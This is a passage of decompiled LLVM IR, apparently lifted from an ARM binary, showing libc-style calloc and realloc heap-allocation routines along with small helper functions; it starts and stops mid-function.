  uselistorder i32 %v7_14448, { 1, 0 }
  uselistorder i32 %v4_14448, { 1, 0 }
  uselistorder i32 %v0_14418, { 1, 0 }
  uselistorder i32 %v2_143ec, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_143e857, { 1, 0 }
  uselistorder i32 %v1_143b4, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_1439c., { 1, 2, 0 }
  uselistorder i32 %v0_143a4, { 0, 1, 3, 2 }
  uselistorder i32 %v1_143a4, { 1, 0 }
  uselistorder i32 %v3_14384, { 1, 0 }
  uselistorder i32 %v4_14380, { 1, 0, 2 }
  uselistorder i32 %v1_142f0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14348, { 1, 0 }
  uselistorder i32 %v1_1432c, { 1, 0 }
  uselistorder i32 %v1_141cc, { 1, 0 }
  uselistorder i32 %v0_1430c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_142d4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14368.pre, { 1, 2, 0 }
  uselistorder i32 %v0_142b0, { 2, 1, 0 }
  uselistorder i32 %v3_142a4, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_141c4, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_1426c, { 1, 0 }
  uselistorder i32 %v3_14260, { 1, 0 }
  uselistorder i32 %v0_1426c, { 1, 0 }
  uselistorder i32 %v3_14244, { 0, 2, 3, 1 }
  uselistorder i32 %v2_14234, { 1, 0, 2 }
  uselistorder i32 %v3_141ec, { 2, 1, 0 }
  uselistorder i32 %v0_141dc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_141ac, { 1, 0 }
  uselistorder i32 %v1_14160, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1415c, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_14100, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_140f4, { 1, 0 }
  uselistorder i32 %v3_140c4, { 1, 0 }
  uselistorder i32 %v0_140b8, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_14098, { 0, 2, 1, 3 }
  uselistorder i1 %v7_1408c, { 1, 0 }
  uselistorder i32 %v0_1405c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 45, 42, 43, 44, 46, 47, 48, 49, 0, 1, 50, 51, 52, 53, 54, 55, 56, 57, 58, 63, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 83, 91, 78, 79, 80, 81, 82, 84, 85, 86, 87, 2, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 27, 1, 3, 4, 5, 17, 9, 6, 18, 7, 8, 11, 10, 15, 12, 19, 14, 13, 20, 16, 24, 22, 21, 23, 26, 25, 28, 56, 29, 30, 57, 31, 32, 33, 34, 35, 38, 39, 36, 37, 44, 41, 40, 42, 43, 45, 50, 46, 47, 48, 49, 52, 51, 55, 54, 53 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 42, 22, 23, 35, 34, 27, 24, 0, 25, 26, 28, 29, 30, 31, 32, 33, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 34, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_14904, { 1, 0 }
  uselistorder label %dec_label_pc_148e8, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_148e4, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_148cc, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_14860, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_147dc, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_147d4, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_146a8, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_145dc, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_14494, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_143e8, { 1, 0 }
  uselistorder label %dec_label_pc_143f0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_143b4, { 1, 0 }
  uselistorder label %dec_label_pc_14368, { 1, 0 }
  uselistorder label %dec_label_pc_142fc, { 1, 0 }
  uselistorder label %dec_label_pc_142f8, { 1, 0 }
  uselistorder label %dec_label_pc_142a4, { 1, 0 }
  uselistorder label %dec_label_pc_14290, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14258, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14244, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_14918(i32 %arg1) local_unnamed_addr {
dec_label_pc_14918:
  %v0_14918 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14918, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_14918
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14918, %bb
  %v4_14934 = phi i32 [ %arg1, %dec_label_pc_14918 ], [ 0, %bb ]
  ret i32 %v4_14934

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_14938 = load i32, i32* @r4, align 4
  %v6_14938 = load i32, i32* @r5, align 4
  %v9_14938 = load i32, i32* @r6, align 4
  %v12_14938 = load i32, i32* @lr, align 4
  %v2_14940 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_14950 = mul i32 %arg2, %arg1
  store i32 %v2_14950, i32* @r6, align 4
  br i1 %v2_14940, label %dec_label_pc_14988, label %dec_label_pc_14958

dec_label_pc_14958:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_14960 = udiv i32 %v2_14950, %arg1
  %v9_14964 = icmp eq i32 %v2_14960, %arg2
  br i1 %v9_14964, label %dec_label_pc_14988, label %dec_label_pc_1496c

dec_label_pc_1496c:                               ; preds = %dec_label_pc_14958
  %v0_14970 = call i32 @__aeabi_read_tp()
  %v3_14974 = load i16, i16* @global_var_244d0.762, align 2
  %v4_14974 = sext i16 %v3_14974 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_14980 = add i32 %v4_14974, %v0_14970
  %v4_14980 = inttoptr i32 %v3_14980 to i32*
  store i32 12, i32* %v4_14980, align 4
  br label %dec_label_pc_14a4c

dec_label_pc_14988:                               ; preds = %dec_label_pc_14958, %entry
  %v4_1498c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 108) to i32*), align 4
  store i32 %v4_1498c, i32* @r4, align 4
  %v4_149a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 112) to i32*), align 4
  store i32 %v4_149a4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_149a4)
  %v0_149b8 = load i32, i32* @r5, align 4
  %v2_149b8 = add i32 %v0_149b8, 16
  %v3_149b8 = inttoptr i32 %v2_149b8 to i32*
  %v4_149b8 = load i32, i32* %v3_149b8, align 4
  store i32 %v4_149b8, i32* %ip.global-to-local, align 4
  store i32 84420, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_149b8)
  %v0_149c4 = load i32, i32* @r6, align 4
  store i32 %v0_149c4, i32* @r0, align 4
  %v0_149c8 = call i32 @malloc()
  store i32 %v0_149c8, i32* %r4.global-to-local, align 4
  %v2_149cc = icmp eq i32 %v0_149c8, 0
  br i1 %v2_149cc, label %.thread, label %dec_label_pc_149d4

dec_label_pc_149d4:                               ; preds = %dec_label_pc_14988
  %v1_149d4 = add i32 %v0_149c8, -4
  %v2_149d4 = inttoptr i32 %v1_149d4 to i32*
  %v3_149d4 = load i32, i32* %v2_149d4, align 4
  %v1_149d8 = and i32 %v3_149d4, 2
  %v2_149d8 = icmp eq i32 %v1_149d8, 0
  br i1 %v2_149d8, label %dec_label_pc_149e0, label %.thread

dec_label_pc_149e0:                               ; preds = %dec_label_pc_149d4
  %v1_149e06 = add i32 %v3_149d4, -4
  %v1_149e4 = and i32 %v1_149e06, -4
  %v3_149e8 = udiv i32 %v1_149e4, 4
  store i32 %v3_149e8, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_149e4, 36
  %v2_149f0 = icmp ult i32 %v1_149e4, 33
  %v3_149f0 = or i1 %tmp, %v2_149f0
  br i1 %v3_149f0, label %dec_label_pc_149fc, label %dec_label_pc_149f4

dec_label_pc_149f4:                               ; preds = %dec_label_pc_149e0
  %v3_149f4 = inttoptr i32 %v0_149c8 to i8*
  %v4_149f4 = call i32 @__GI_memset(i8* %v3_149f4, i32 0, i32 %v1_149e4)
  br label %.thread

dec_label_pc_149fc:                               ; preds = %dec_label_pc_149e0
  %tmp7 = icmp eq i32 %v1_149e4, 16
  %v2_14a00 = inttoptr i32 %v0_149c8 to i32*
  store i32 0, i32* %v2_14a00, align 4
  %v1_14a04 = load i32, i32* %r4.global-to-local, align 4
  %v2_14a04 = add i32 %v1_14a04, 4
  %v3_14a04 = inttoptr i32 %v2_14a04 to i32*
  store i32 0, i32* %v3_14a04, align 4
  %v1_14a08 = load i32, i32* %r4.global-to-local, align 4
  %v2_14a08 = add i32 %v1_14a08, 8
  %v3_14a08 = inttoptr i32 %v2_14a08 to i32*
  store i32 0, i32* %v3_14a08, align 4
  %v2_14a0c = icmp ult i32 %v1_149e4, 13
  %v3_14a0c = or i1 %tmp7, %v2_14a0c
  br i1 %v3_14a0c, label %.thread, label %dec_label_pc_14a10

dec_label_pc_14a10:                               ; preds = %dec_label_pc_149fc
  %v0_14a10 = load i32, i32* %ip.global-to-local, align 4
  %v1_14a14 = load i32, i32* %r4.global-to-local, align 4
  %v2_14a14 = add i32 %v1_14a14, 12
  %v3_14a14 = inttoptr i32 %v2_14a14 to i32*
  store i32 0, i32* %v3_14a14, align 4
  %v1_14a18 = load i32, i32* %r4.global-to-local, align 4
  %v2_14a18 = add i32 %v1_14a18, 16
  %v3_14a18 = inttoptr i32 %v2_14a18 to i32*
  store i32 0, i32* %v3_14a18, align 4
  %tmp8 = icmp ult i32 %v0_14a10, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_14a20

dec_label_pc_14a20:                               ; preds = %dec_label_pc_14a10
  %v0_14a20 = load i32, i32* %ip.global-to-local, align 4
  %v7_14a20 = icmp eq i32 %v0_14a20, 9
  %v1_14a24 = load i32, i32* %r4.global-to-local, align 4
  %v2_14a24 = add i32 %v1_14a24, 20
  %v3_14a24 = inttoptr i32 %v2_14a24 to i32*
  store i32 0, i32* %v3_14a24, align 4
  %v1_14a28 = load i32, i32* %r4.global-to-local, align 4
  %v2_14a28 = add i32 %v1_14a28, 24
  %v3_14a28 = inttoptr i32 %v2_14a28 to i32*
  store i32 0, i32* %v3_14a28, align 4
  br i1 %v7_14a20, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14a20
  %v2_14a2c = load i32, i32* %r4.global-to-local, align 4
  %v3_14a2c = add i32 %v2_14a2c, 32
  %v4_14a2c = inttoptr i32 %v3_14a2c to i32*
  store i32 0, i32* %v4_14a2c, align 4
  %v2_14a30 = load i32, i32* %r4.global-to-local, align 4
  %v3_14a30 = add i32 %v2_14a30, 28
  %v4_14a30 = inttoptr i32 %v3_14a30 to i32*
  store i32 0, i32* %v4_14a30, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14a20, %dec_label_pc_149d4, %dec_label_pc_14a10, %dec_label_pc_149fc, %dec_label_pc_14988, %dec_label_pc_149f4, %bb
  store i32 1, i32* @r1, align 4
  %v0_14a40 = load i32, i32* @r5, align 4
  %v2_14a40 = add i32 %v0_14a40, 44
  %v3_14a40 = inttoptr i32 %v2_14a40 to i32*
  %v4_14a40 = load i32, i32* %v3_14a40, align 4
  store i32 %v4_14a40, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14a40)
  br label %dec_label_pc_14a4c

dec_label_pc_14a4c:                               ; preds = %dec_label_pc_1496c, %.thread
  %v0_14a4c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_14938, i32* @r4, align 4
  store i32 %v6_14938, i32* @r5, align 4
  store i32 %v9_14938, i32* @r6, align 4
  store i32 %v12_14938, i32* @lr, align 4
  ret i32 %v0_14a4c

; uselistorder directives
  uselistorder i32 %v1_149e4, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_149c8, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 2, 7, 3, 8, 4, 9, 5, 10, 11, 6, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_14a4c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_14a64(i32 %arg1) local_unnamed_addr {
dec_label_pc_14a64:
  %v0_14a64 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14a64, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_14a64
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14a64, %bb
  %v4_14a74 = phi i32 [ %arg1, %dec_label_pc_14a64 ], [ 0, %bb ]
  ret i32 %v4_14a74

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_14a78 = load i32, i32* @r4, align 4
  %v6_14a78 = load i32, i32* @r5, align 4
  %v9_14a78 = load i32, i32* @r6, align 4
  %v12_14a78 = load i32, i32* @r7, align 4
  %v15_14a78 = load i32, i32* @r8, align 4
  %v18_14a78 = load i32, i32* @sb, align 4
  %v21_14a78 = load i32, i32* @sl, align 4
  %v24_14a78 = load i32, i32* @fp, align 4
  %v27_14a78 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_14a84 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_14a84, label %dec_label_pc_14a98, label %dec_label_pc_14aa8

dec_label_pc_14a98:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_14a9c = call i32 @malloc()
  store i32 %v0_14a9c, i32* %r0.global-to-local, align 4
  store i32 %v0_14a9c, i32* @r4, align 4
  br label %dec_label_pc_14e08

dec_label_pc_14aa8:                               ; preds = %entry
  %v2_14aa8 = icmp eq i32 %arg2, 0
  br i1 %v2_14aa8, label %dec_label_pc_14ab0, label %dec_label_pc_14abc

dec_label_pc_14ab0:                               ; preds = %dec_label_pc_14aa8
  %v0_14ab0 = call i32 @free()
  store i32 %v0_14ab0, i32* %r0.global-to-local, align 4
  %v0_14ab4 = load i32, i32* @r6, align 4
  store i32 %v0_14ab4, i32* @r4, align 4
  br label %dec_label_pc_14e08

dec_label_pc_14abc:                               ; preds = %dec_label_pc_14aa8
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_14ac4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 108) to i32*), align 4
  store i32 %v4_14ac4, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_14ac4, i32* %r2.global-to-local, align 4
  %v4_14ad0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 68) to i32*), align 4
  store i32 %v4_14ad0, i32* %r1.global-to-local, align 4
  %v2_14ad4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_14ad4, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_14adc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14adc)
  %v0_14ae8 = load i32, i32* @r4, align 4
  store i32 %v0_14ae8, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r1.global-to-local, align 4
  %v4_14af4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_14b00.872 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14af4)
  %v0_14b00 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_14b00, -32
  br i1 %tmp36, label %dec_label_pc_14b24, label %dec_label_pc_14b08

dec_label_pc_14b08:                               ; preds = %dec_label_pc_14abc
  store i32 63928, i32* %r2.global-to-local, align 4
  %v0_14b0c = call i32 @__aeabi_read_tp()
  store i32 %v0_14b0c, i32* %r0.global-to-local, align 4
  %v3_14b10 = load i16, i16* @global_var_244d0.762, align 2
  %v4_14b10 = sext i16 %v3_14b10 to i32
  store i32 %v4_14b10, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_14b1c = add i32 %v4_14b10, %v0_14b0c
  %v4_14b1c = inttoptr i32 %v3_14b1c to i32*
  store i32 12, i32* %v4_14b1c, align 4
  br label %dec_label_pc_14e08

dec_label_pc_14b24:                               ; preds = %dec_label_pc_14abc
  %v1_14b24 = add i32 %v0_14b00, 11
  store i32 %v1_14b24, i32* %r0.global-to-local, align 4
  %v0_14b28 = load i32, i32* @r5, align 4
  %v1_14b28 = add i32 %v0_14b28, -4
  %v2_14b28 = inttoptr i32 %v1_14b28 to i32*
  %v3_14b28 = load i32, i32* %v2_14b28, align 4
  store i32 %v3_14b28, i32* %r2.global-to-local, align 4
  %v2_14b2c = icmp ugt i32 %v1_14b24, 14
  %v7_14b2c = icmp eq i32 %v1_14b24, 15
  %v2_14b30 = xor i1 %v2_14b2c, true
  %v3_14b30 = or i1 %v7_14b2c, %v2_14b30
  br i1 %v3_14b30, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_14b24
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_14b24, %bb
  %v2_14b34 = xor i1 %v7_14b2c, true
  %v3_14b34 = and i1 %v2_14b2c, %v2_14b34
  br i1 %v3_14b34, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_14b34 = and i32 %v1_14b24, -8
  store i32 %v5_14b34, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_14b38 = and i32 %v3_14b28, 2
  %v2_14b38 = icmp eq i32 %v1_14b38, 0
  %v1_14b3c = add i32 %v0_14b28, -8
  store i32 %v1_14b3c, i32* @sl, align 4
  %v1_14b40 = and i32 %v3_14b28, -4
  store i32 %v1_14b40, i32* @r6, align 4
  br i1 %v2_14b38, label %dec_label_pc_14b48, label %dec_label_pc_14d20

dec_label_pc_14b48:                               ; preds = %bb29
  %v1_14b48 = load i32, i32* @sb, align 4
  %v3_14b48 = icmp ult i32 %v1_14b40, %v1_14b48
  br i1 %v3_14b48, label %dec_label_pc_14b54, label %bb30

bb30:                                             ; preds = %dec_label_pc_14b48
  store i32 %v1_14b40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14cb8

dec_label_pc_14b54:                               ; preds = %dec_label_pc_14b48
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_14b5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  store i32 %v4_14b5c, i32* %r0.global-to-local, align 4
  %v1_14b60 = add i32 %v4_14b5c, 44
  %v2_14b60 = inttoptr i32 %v1_14b60 to i32*
  %v3_14b60 = load i32, i32* %v2_14b60, align 4
  store i32 %v3_14b60, i32* %r3.global-to-local, align 4
  %v2_14b64 = add i32 %v1_14b40, %v1_14b3c
  store i32 %v2_14b64, i32* @r4, align 4
  %v9_14b68 = icmp eq i32 %v2_14b64, %v3_14b60
  %v1_14b6c = add i32 %v2_14b64, 4
  %v2_14b6c = inttoptr i32 %v1_14b6c to i32*
  %v3_14b6c = load i32, i32* %v2_14b6c, align 4
  store i32 %v3_14b6c, i32* %r1.global-to-local, align 4
  br i1 %v9_14b68, label %dec_label_pc_14b74, label %dec_label_pc_14bb0

dec_label_pc_14b74:                               ; preds = %dec_label_pc_14b54
  %v1_14b74 = and i32 %v3_14b6c, -4
  %v2_14b78 = add i32 %v1_14b74, %v1_14b40
  store i32 %v2_14b78, i32* %r1.global-to-local, align 4
  %v1_14b7c = add i32 %v1_14b48, 16
  store i32 %v1_14b7c, i32* %r3.global-to-local, align 4
  %v3_14b80 = icmp ult i32 %v2_14b78, %v1_14b7c
  br i1 %v3_14b80, label %dec_label_pc_14c04, label %dec_label_pc_14b88

dec_label_pc_14b88:                               ; preds = %dec_label_pc_14b74
  %v2_14b88 = sub i32 %v2_14b78, %v1_14b48
  %v1_14b8c = urem i32 %v3_14b28, 2
  %v2_14b90 = add i32 %v1_14b48, %v1_14b3c
  store i32 %v2_14b90, i32* %r1.global-to-local, align 4
  %v2_14b94 = or i32 %v1_14b48, %v1_14b8c
  store i32 %v2_14b94, i32* %r2.global-to-local, align 4
  %v1_14b98 = or i32 %v2_14b88, 1
  store i32 %v1_14b98, i32* %r3.global-to-local, align 4
  store i32 %v0_14b28, i32* @r4, align 4
  store i32 %v2_14b94, i32* %v2_14b28, align 4
  %v0_14ba4 = load i32, i32* %r1.global-to-local, align 4
  %v1_14ba4 = load i32, i32* %r0.global-to-local, align 4
  %v2_14ba4 = add i32 %v1_14ba4, 44
  %v3_14ba4 = inttoptr i32 %v2_14ba4 to i32*
  store i32 %v0_14ba4, i32* %v3_14ba4, align 4
  %v0_14ba8 = load i32, i32* %r3.global-to-local, align 4
  %v1_14ba8 = load i32, i32* %r1.global-to-local, align 4
  %v2_14ba8 = add i32 %v1_14ba8, 4
  %v3_14ba8 = inttoptr i32 %v2_14ba8 to i32*
  store i32 %v0_14ba8, i32* %v3_14ba8, align 4
  br label %dec_label_pc_14dec

dec_label_pc_14bb0:                               ; preds = %dec_label_pc_14b54
  %v1_14bb0 = and i32 %v3_14b6c, -2
  %v2_14bb4 = add i32 %v1_14bb0, %v2_14b64
  store i32 %v2_14bb4, i32* %r3.global-to-local, align 4
  %v1_14bb8 = add i32 %v2_14bb4, 4
  %v2_14bb8 = inttoptr i32 %v1_14bb8 to i32*
  %v3_14bb8 = load i32, i32* %v2_14bb8, align 4
  store i32 %v3_14bb8, i32* %r3.global-to-local, align 4
  %v1_14bbc = urem i32 %v3_14bb8, 2
  %v2_14bbc = icmp eq i32 %v1_14bbc, 0
  br i1 %v2_14bbc, label %dec_label_pc_14bc4, label %dec_label_pc_14c04

dec_label_pc_14bc4:                               ; preds = %dec_label_pc_14bb0
  %v1_14bc4 = and i32 %v3_14b6c, -4
  store i32 %v1_14bc4, i32* %r3.global-to-local, align 4
  %v2_14bc8 = add i32 %v1_14bc4, %v1_14b40
  store i32 %v2_14bc8, i32* %r0.global-to-local, align 4
  %v3_14bcc = icmp ult i32 %v2_14bc8, %v1_14b48
  br i1 %v3_14bcc, label %dec_label_pc_14c04, label %dec_label_pc_14bd4

dec_label_pc_14bd4:                               ; preds = %dec_label_pc_14bc4
  %v1_14bd4 = add i32 %v1_14b40, %v0_14b28
  %v2_14bd4 = inttoptr i32 %v1_14bd4 to i32*
  %v3_14bd4 = load i32, i32* %v2_14bd4, align 4
  store i32 %v3_14bd4, i32* %r1.global-to-local, align 4
  %v1_14bd8 = add i32 %v3_14bd4, 12
  %v2_14bd8 = inttoptr i32 %v1_14bd8 to i32*
  %v3_14bd8 = load i32, i32* %v2_14bd8, align 4
  store i32 %v3_14bd8, i32* %r3.global-to-local, align 4
  %v9_14bdc = icmp eq i32 %v3_14bd8, %v2_14b64
  %v1_14be0 = add i32 %v2_14b64, 12
  %v2_14be0 = inttoptr i32 %v1_14be0 to i32*
  %v3_14be0 = load i32, i32* %v2_14be0, align 4
  store i32 %v3_14be0, i32* %r2.global-to-local, align 4
  br i1 %v9_14bdc, label %dec_label_pc_14be8, label %dec_label_pc_14bf4

dec_label_pc_14be8:                               ; preds = %dec_label_pc_14bd4
  %v1_14be8 = add i32 %v3_14be0, 8
  %v2_14be8 = inttoptr i32 %v1_14be8 to i32*
  %v3_14be8 = load i32, i32* %v2_14be8, align 4
  store i32 %v3_14be8, i32* %r3.global-to-local, align 4
  %v9_14bec = icmp eq i32 %v3_14be8, %v2_14b64
  br i1 %v9_14bec, label %dec_label_pc_14bf8, label %dec_label_pc_14bf4

dec_label_pc_14bf4:                               ; preds = %dec_label_pc_14bd4, %dec_label_pc_14be8
  %v0_14bf4 = call i32 @abort()
  store i32 %v0_14bf4, i32* %r0.global-to-local, align 4
  %v0_14bf8.pre = load i32, i32* @r1, align 4
  %v1_14bf8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_14bf8

dec_label_pc_14bf8:                               ; preds = %dec_label_pc_14be8, %dec_label_pc_14bf4
  %v1_14bf8 = phi i32 [ %v3_14be0, %dec_label_pc_14be8 ], [ %v1_14bf8.pre, %dec_label_pc_14bf4 ]
  %v0_14bf8 = phi i32 [ %v3_14bd4, %dec_label_pc_14be8 ], [ %v0_14bf8.pre, %dec_label_pc_14bf4 ]
  %v2_14bf8 = add i32 %v1_14bf8, 8
  %v3_14bf8 = inttoptr i32 %v2_14bf8 to i32*
  store i32 %v0_14bf8, i32* %v3_14bf8, align 4
  %v0_14bfc = load i32, i32* %r2.global-to-local, align 4
  %v1_14bfc = load i32, i32* %r1.global-to-local, align 4
  %v2_14bfc = add i32 %v1_14bfc, 12
  %v3_14bfc = inttoptr i32 %v2_14bfc to i32*
  store i32 %v0_14bfc, i32* %v3_14bfc, align 4
  %v1_14cb8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14cb8

dec_label_pc_14c04:                               ; preds = %dec_label_pc_14b74, %dec_label_pc_14bc4, %dec_label_pc_14bb0
  %v1_14c04 = add i32 %v1_14b48, -7
  store i32 %v1_14c04, i32* @r0, align 4
  %v0_14c08 = call i32 @malloc()
  store i32 %v0_14c08, i32* @r0, align 4
  store i32 %v0_14c08, i32* %r1.global-to-local, align 4
  %v2_14c0c = icmp eq i32 %v0_14c08, 0
  br i1 %v2_14c0c, label %bb31, label %dec_label_pc_14c18

bb31:                                             ; preds = %dec_label_pc_14c04
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_14dec

dec_label_pc_14c18:                               ; preds = %dec_label_pc_14c04
  %v1_14c20.pre = load i32, i32* @r4, align 4
  %v1_14c18 = add i32 %v0_14c08, -4
